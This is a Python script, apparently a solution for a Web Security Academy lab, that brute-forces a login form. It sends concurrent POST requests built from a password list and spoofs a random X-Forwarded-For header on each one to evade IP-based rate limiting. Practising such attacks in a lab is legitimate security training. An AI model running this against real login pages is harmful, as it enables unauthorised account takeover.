#!/usr/bin/env python3
# Copyright (c) 2025-present, Swadhin
# Requirements:
# requests==2.32.3
# aiohttp==3.11.16

import random
import requests
import asyncio
import aiohttp


async def enumerate_password(
    client: aiohttp.ClientSession, url: str, username: str, payload_file: str
):
    """Asynchronously enumerates passwords."""
    payloads = []

    try:
        with open(payload_file, "r+") as f:
            payloads = [line.strip() for line in f]
    except Exception as e:
        print(f"Error - {e}")
        return

    async def check_password(username, password):
        """Asynchronously checks a single password."""
        data = {"username": username, "password": password}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": f"{random.randint(0, 1000)}",
        }
        try:
            async with client.post(
                url, headers=headers, data=data, allow_redirects=False, ssl=False
            ) as res:
                if res.status != 200:
                    print(username, password, res.status)
        except aiohttp.ClientError as e:
            print(f"Error checking {username}: {e}")

    tasks = [check_password(username, password) for password in payloads]
    await asyncio.gather(*tasks)


async def main():
    """Main asynchronous function."""
    client = requests.session()

    async with aiohttp.ClientSession(trust_env=True) as client:
        await enumerate_password(
            client,
            url="https://YOUR-LAB-ID.web-security-academy.net/login",
            username="YOUR-PASSWORD",
            payload_file="passwords.txt",
        )


if __name__ == "__main__":
    asyncio.run(main())
